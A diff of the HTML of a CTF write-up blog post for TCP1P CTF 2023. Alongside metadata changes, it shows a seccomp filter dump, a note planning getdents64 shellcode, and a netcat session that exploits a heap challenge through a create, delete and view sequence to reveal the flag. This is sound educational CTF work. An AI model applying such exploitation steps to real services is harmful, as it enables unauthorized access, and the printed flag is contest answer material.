@@ -9,16 +9,18 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://chovid99.github.io/posts/tcp1p-ctf-2023/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-10-15T21:52:15+07:00" />
-<meta property="article:modified_time" content="2023-10-16T15:26:27+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
+<meta property="article:modified_time" content="2023-10-16T15:30:25+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
+
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png"/>
 
 <meta name="twitter:title" content="TCP1P CTF 2023"/>
 <meta name="twitter:description" content="Writeup for TCP1P CTF 2023 by Fidethus"/>
+<meta name="twitter:site" content="@Chovid99"/>
 <meta name="application-name" content="Chovid99&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/tcp1p-ctf-2023/" /><link rel="prev" href="https://chovid99.github.io/posts/blackhat-mea-ctf-2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/tcp1p-ctf-2023/" /><link rel="prev" href="https://chovid99.github.io/posts/blackhat-mea-ctf-2023/" /><link rel="next" href="https://chovid99.github.io/posts/cyber-jawara-2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
     {
@@ -30,7 +32,7 @@
             "@type": "WebPage",
             "@id": "https:\/\/chovid99.github.io\/posts\/tcp1p-ctf-2023\/"
         },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, TCP1P, 2023, pwn, blockchain","wordcount":  10820 ,
-        "url": "https:\/\/chovid99.github.io\/posts\/tcp1p-ctf-2023\/","datePublished": "2023-10-15T21:52:15+07:00","dateModified": "2023-10-16T15:26:27+07:00","publisher": {
+        "url": "https:\/\/chovid99.github.io\/posts\/tcp1p-ctf-2023\/","datePublished": "2023-10-15T21:52:15+07:00","dateModified": "2023-10-16T15:30:25+07:00","publisher": {
             "@type": "Organization",
             "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                 "@type": "Person",
@@ -408,20 +410,20 @@
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">seccomp-tools dump ./chall       
-</span></span><span class="line"><span class="cl"> line  CODE  JT   JF      K
-</span></span><span class="line"><span class="cl">=================================
-</span></span><span class="line"><span class="cl"> 0000: 0x20 0x00 0x00 0x00000004  A = arch
-</span></span><span class="line"><span class="cl"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
-</span></span><span class="line"><span class="cl"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
-</span></span><span class="line"><span class="cl"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
-</span></span><span class="line"><span class="cl"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
-</span></span><span class="line"><span class="cl"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
-</span></span><span class="line"><span class="cl"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
-</span></span><span class="line"><span class="cl"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
-</span></span><span class="line"><span class="cl"> 0008: 0x15 0x00 0x01 0x000000d9  if (A != getdents64) goto 0010
-</span></span><span class="line"><span class="cl"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
-</span></span><span class="line"><span class="cl"> 0010: 0x06 0x00 0x00 0x00000000  return KILL
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">seccomp</span><span class="o">-</span><span class="n">tools</span> <span class="n">dump</span> <span class="o">./</span><span class="n">chall</span>       
+</span></span><span class="line"><span class="cl"> <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
+</span></span><span class="line"><span class="cl"><span class="o">=================================</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0000</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0001</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x08</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0010</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0002</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0003</span><span class="p">:</span> <span class="mh">0x35</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x40000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&lt;</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0005</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0004</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x05</span> <span class="mh">0xffffffff</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0010</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0005</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x03</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">read</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0009</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0006</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x00</span> <span class="mh">0x00000001</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">write</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0009</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0007</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x01</span> <span class="mh">0x00</span> <span class="mh">0x00000002</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">open</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0009</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0008</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x000000d9</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">getdents64</span><span class="p">)</span> <span class="n">goto</span> <span class="mi">0010</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0009</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+</span></span><span class="line"><span class="cl"> <span class="mi">0010</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>There are 4 allowed <code>syscalls</code>, namely <code>read</code>, <code>write</code>, <code>open</code>, and <code>getdents64</code>. First, let&rsquo;s identify the name of the <code>flag</code> file using <code>getdents64</code>. We need to create <code>shellcode</code> that will execute the following instructions:</p>
@@ -971,124 +973,124 @@
 </span><span class="lnt">118
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc ctf.tcp1p.com 4267
-</span></span><span class="line"><span class="cl">Menu:
-</span></span><span class="line"><span class="cl">(1) create [1-10]
-</span></span><span class="line"><span class="cl">(2) delete [1-10]
-</span></span><span class="line"><span class="cl">(3) view   [1-10]
-</span></span><span class="line"><span class="cl">(4) flag
-</span></span><span class="line"><span class="cl">(5) exit
-</span></span><span class="line"><span class="cl">&gt; 1
-</span></span><span class="line"><span class="cl">Index: 1
-</span></span><span class="line"><span class="cl">Size: 112
-</span></span><span class="line"><span class="cl">Content: a
-</span></span><span class="line"><span class="cl">[*] creation success
-</span></span><span class="line"><span class="cl">Menu:
-</span></span><span class="line"><span class="cl">(1) create [1-10]
-</span></span><span class="line"><span class="cl">(2) delete [1-10]
-</span></span><span class="line"><span class="cl">(3) view   [1-10]
-</span></span><span class="line"><span class="cl">(4) flag
-</span></span><span class="line"><span class="cl">(5) exit
-</span></span><span class="line"><span class="cl">&gt; 1
-</span></span><span class="line"><span class="cl">Index: 2
-</span></span><span class="line"><span class="cl">Size: 112
-</span></span><span class="line"><span class="cl">Content: a
-</span></span><span class="line"><span class="cl">[*] creation success
-</span></span><span class="line"><span class="cl">Menu:
-</span></span><span class="line"><span class="cl">(1) create [1-10]
-</span></span><span class="line"><span class="cl">(2) delete [1-10]
-</span></span><span class="line"><span class="cl">(3) view   [1-10]
-</span></span><span class="line"><span class="cl">(4) flag
-</span></span><span class="line"><span class="cl">(5) exit
-</span></span><span class="line"><span class="cl">&gt; 1
-</span></span><span class="line"><span class="cl">Index: 3
-</span></span><span class="line"><span class="cl">Size: 112
-</span></span><span class="line"><span class="cl">Content: a
-</span></span><span class="line"><span class="cl">[*] creation success
-</span></span><span class="line"><span class="cl">Menu:
-</span></span><span class="line"><span class="cl">(1) create [1-10]
-</span></span><span class="line"><span class="cl">(2) delete [1-10]
-</span></span><span class="line"><span class="cl">(3) view   [1-10]
-</span></span><span class="line"><span class="cl">(4) flag
-</span></span><span class="line"><span class="cl">(5) exit
-</span></span><span class="line"><span class="cl">&gt; 1
-</span></span><span class="line"><span class="cl">Index: 4
-</span></span><span class="line"><span class="cl">Size: 112
-</span></span><span class="line"><span class="cl">Content: a
-</span></span><span class="line"><span class="cl">[*] creation success
-</span></span><span class="line"><span class="cl">Menu:
-</span></span><span class="line"><span class="cl">(1) create [1-10]
-</span></span><span class="line"><span class="cl">(2) delete [1-10]
-</span></span><span class="line"><span class="cl">(3) view   [1-10]
-</span></span><span class="line"><span class="cl">(4) flag
-</span></span><span class="line"><span class="cl">(5) exit
-</span></span><span class="line"><span class="cl">&gt; 1
-</span></span><span class="line"><span class="cl">Index: 5  
-</span></span><span class="line"><span class="cl">Size: 112
-</span></span><span class="line"><span class="cl">Content: a
-</span></span><span class="line"><span class="cl">[*] creation success
-</span></span><span class="line"><span class="cl">Menu:
-</span></span><span class="line"><span class="cl">(1) create [1-10]
-</span></span><span class="line"><span class="cl">(2) delete [1-10]
-</span></span><span class="line"><span class="cl">(3) view   [1-10]
-</span></span><span class="line"><span class="cl">(4) flag
-</span></span><span class="line"><span class="cl">(5) exit
-</span></span><span class="line"><span class="cl">&gt; 2
-</span></span><span class="line"><span class="cl">Index: 1
-</span></span><span class="line"><span class="cl">[*] deletion success
-</span></span><span class="line"><span class="cl">Menu:
-</span></span><span class="line"><span class="cl">(1) create [1-10]
-</span></span><span class="line"><span class="cl">(2) delete [1-10]
-</span></span><span class="line"><span class="cl">(3) view   [1-10]
-</span></span><span class="line"><span class="cl">(4) flag
-</span></span><span class="line"><span class="cl">(5) exit
-</span></span><span class="line"><span class="cl">&gt; 2
-</span></span><span class="line"><span class="cl">Index: 2
-</span></span><span class="line"><span class="cl">[*] deletion success
-</span></span><span class="line"><span class="cl">Menu:
-</span></span><span class="line"><span class="cl">(1) create [1-10]
-</span></span><span class="line"><span class="cl">(2) delete [1-10]
-</span></span><span class="line"><span class="cl">(3) view   [1-10]
-</span></span><span class="line"><span class="cl">(4) flag
-</span></span><span class="line"><span class="cl">(5) exit
-</span></span><span class="line"><span class="cl">&gt; 2
-</span></span><span class="line"><span class="cl">Index: 3
-</span></span><span class="line"><span class="cl">[*] deletion success
-</span></span><span class="line"><span class="cl">Menu:
-</span></span><span class="line"><span class="cl">(1) create [1-10]
-</span></span><span class="line"><span class="cl">(2) delete [1-10]
-</span></span><span class="line"><span class="cl">(3) view   [1-10]
-</span></span><span class="line"><span class="cl">(4) flag
-</span></span><span class="line"><span class="cl">(5) exit
-</span></span><span class="line"><span class="cl">&gt; 2
-</span></span><span class="line"><span class="cl">Index: 4
-</span></span><span class="line"><span class="cl">[*] deletion success
-</span></span><span class="line"><span class="cl">Menu:
-</span></span><span class="line"><span class="cl">(1) create [1-10]
-</span></span><span class="line"><span class="cl">(2) delete [1-10]
-</span></span><span class="line"><span class="cl">(3) view   [1-10]
-</span></span><span class="line"><span class="cl">(4) flag
-</span></span><span class="line"><span class="cl">(5) exit
-</span></span><span class="line"><span class="cl">&gt; 2
-</span></span><span class="line"><span class="cl">Index: 5
-</span></span><span class="line"><span class="cl">[*] deletion success
-</span></span><span class="line"><span class="cl">Menu:
-</span></span><span class="line"><span class="cl">(1) create [1-10]
-</span></span><span class="line"><span class="cl">(2) delete [1-10]
-</span></span><span class="line"><span class="cl">(3) view   [1-10]
-</span></span><span class="line"><span class="cl">(4) flag
-</span></span><span class="line"><span class="cl">(5) exit
-</span></span><span class="line"><span class="cl">&gt; 4
-</span></span><span class="line"><span class="cl">[*] flag loaded into memory
-</span></span><span class="line"><span class="cl">Menu:
-</span></span><span class="line"><span class="cl">(1) create [1-10]
-</span></span><span class="line"><span class="cl">(2) delete [1-10]
-</span></span><span class="line"><span class="cl">(3) view   [1-10]
-</span></span><span class="line"><span class="cl">(4) flag
-</span></span><span class="line"><span class="cl">(5) exit
-</span></span><span class="line"><span class="cl">&gt; 3
-</span></span><span class="line"><span class="cl">Index: 1
-</span></span><span class="line"><span class="cl">[*] Data: TCP1P{k4mu_m4kan_ap4_1ni_k0q_un1qu3_s3k4li_yh_k4kung_chef_0ma1good_r3cyle???}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">nc</span> <span class="n">ctf</span><span class="o">.</span><span class="n">tcp1p</span><span class="o">.</span><span class="n">com</span> <span class="mi">4267</span>
+</span></span><span class="line"><span class="cl"><span class="n">Menu</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">create</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">delete</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">view</span>   <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Index</span><span class="p">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Size</span><span class="p">:</span> <span class="mi">112</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="p">:</span> <span class="n">a</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">creation</span> <span class="n">success</span>
+</span></span><span class="line"><span class="cl"><span class="n">Menu</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">create</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">delete</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">view</span>   <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Index</span><span class="p">:</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Size</span><span class="p">:</span> <span class="mi">112</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="p">:</span> <span class="n">a</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">creation</span> <span class="n">success</span>
+</span></span><span class="line"><span class="cl"><span class="n">Menu</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">create</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">delete</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">view</span>   <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Index</span><span class="p">:</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">Size</span><span class="p">:</span> <span class="mi">112</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="p">:</span> <span class="n">a</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">creation</span> <span class="n">success</span>
+</span></span><span class="line"><span class="cl"><span class="n">Menu</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">create</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">delete</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">view</span>   <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Index</span><span class="p">:</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">Size</span><span class="p">:</span> <span class="mi">112</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="p">:</span> <span class="n">a</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">creation</span> <span class="n">success</span>
+</span></span><span class="line"><span class="cl"><span class="n">Menu</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">create</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">delete</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">view</span>   <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Index</span><span class="p">:</span> <span class="mi">5</span>  
+</span></span><span class="line"><span class="cl"><span class="n">Size</span><span class="p">:</span> <span class="mi">112</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="p">:</span> <span class="n">a</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">creation</span> <span class="n">success</span>
+</span></span><span class="line"><span class="cl"><span class="n">Menu</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">create</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">delete</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">view</span>   <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Index</span><span class="p">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">deletion</span> <span class="n">success</span>
+</span></span><span class="line"><span class="cl"><span class="n">Menu</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">create</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">delete</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">view</span>   <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Index</span><span class="p">:</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">deletion</span> <span class="n">success</span>
+</span></span><span class="line"><span class="cl"><span class="n">Menu</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">create</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">delete</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">view</span>   <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Index</span><span class="p">:</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">deletion</span> <span class="n">success</span>
+</span></span><span class="line"><span class="cl"><span class="n">Menu</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">create</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">delete</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">view</span>   <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Index</span><span class="p">:</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">deletion</span> <span class="n">success</span>
+</span></span><span class="line"><span class="cl"><span class="n">Menu</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">create</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="n">delete</span> <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">view</span>   <span class="p">[</span><span class="mi">1</span><span class="o">-</span><span class="mi">10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">flag</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Index</span><span class="p">:</span> <span class="mi">5</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">deletion</span> <span class="n">success</span>
+</span></span><span class="line"><span class="cl"><span class="n">Menu</span><span class="p">:</span>
